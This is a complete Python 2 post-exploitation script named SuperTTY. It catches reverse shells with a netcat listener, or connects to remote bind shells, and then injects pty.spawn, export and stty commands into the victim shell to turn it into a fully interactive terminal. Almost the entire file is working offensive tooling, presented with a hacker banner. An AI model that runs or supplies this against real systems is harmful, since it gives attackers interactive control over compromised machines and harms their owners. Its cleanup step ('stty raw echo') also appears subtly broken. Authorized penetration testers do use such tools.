#!/usr/bin/env python
"""SuperTTY v1.0
Usage:
    supertty.py --port <port> --host <host> [--shell <shell>]
    supertty.py --port <port> [--ip <ip>] [--shell <shell>]
    supertty.py (-h | --help)

Options:
    -h --help           Show this screen
    --port <port>       Port number to listen on to to connect to the remote host on [default: 4445]
    --host <host>       Host to connect to for bind shells
    --ip <ip>           ip to listen on for reverse shells [default: "0.0.0.0"]
    --shell <shell>     Shell spawn as PTY [default: /bin/bash]
"""

banner = """ (                                        )                  
 )\ )                     *   )  *   ) ( /(          )    )  
(()/(  (          (  (  ` )  /(` )  /( )\())   )  ( /( ( /(  
 /(_))))\ `  )   ))\ )(  ( )(_))( )(_)|(_)\   /(( )\()))\()) 
(_)) /((_)/(/(  /((_|()\(_(_())(_(_())_ ((_) (_))((_)\((_)\  
/ __(_))(((_)_\(_))  ((_)_   _||_   _\ \ / / _)((_) (_)  (_) 
\__ \ || | '_ \) -_)| '_| | |    | |  \ V /  \ V /| || () |  
|___/\_,_| .__/\___||_|   |_|    |_|   |_|    \_/ |_(_)__/   
         |_|                                                 
         (c) Bad Hombres 2017
"""

import os
import subprocess
import sys
import time
import signal
import select
from docopt import docopt

args = docopt(__doc__, version="SuperTTY 1.0")
p = None
print banner

nc = []
if args["--host"] is None:
    print "[+] Starting a reverse listener on port: %s" % args["--port"]
    nc = ["nc", "-nvlp", args["--port"]]
else:
    print "[+] Connecting to a bind shell on: %s:%s" % (args["--host"], args["--port"])
    nc = ["nc", args["--host"], args["--port"]]


def sigint_handler(signal, frame):
    print "!!!!!SIGINT!!!!!"
    p.kill()
    sys.exit()

signal.signal(signal.SIGINT, sigint_handler)

try:
    term = os.environ["TERM"]
    rows, columns = os.popen('stty size', 'r').read().split()

    print "[+] Got terminal: %s " % term
    print "[+] Got terminal size (%s rows, %s columns)" % (rows, columns)
    print "[+] Setting up local terminal....."
    os.system("stty raw -echo")

    p = subprocess.Popen(nc, stdin=subprocess.PIPE)

    shell = args["--shell"]
    p.stdin.write("reset\n")
    p.stdin.flush()
    p.stdin.write("python -c 'import pty; pty.spawn(\"%s\")'\n" % shell)
    p.stdin.flush()
    p.stdin.write("export TERM=%s\n" % term)
    p.stdin.flush()
    p.stdin.write("export SHELL=%s\n" % shell)
    p.stdin.flush()
    p.stdin.write("stty rows %s columns %s\n" % (rows, columns))
    p.stdin.flush()

    while 1:
        line = sys.stdin.read(1)
        if ord(line[0]) in [3, 4]: break
        if line == "": break
        p.stdin.write(line)

finally:
    print "[+} Resetting local terminal....."
    os.system("stty raw echo")
    os.system("reset")
    p.kill()
    print banner
    print "[+} Hack el planeta!....."
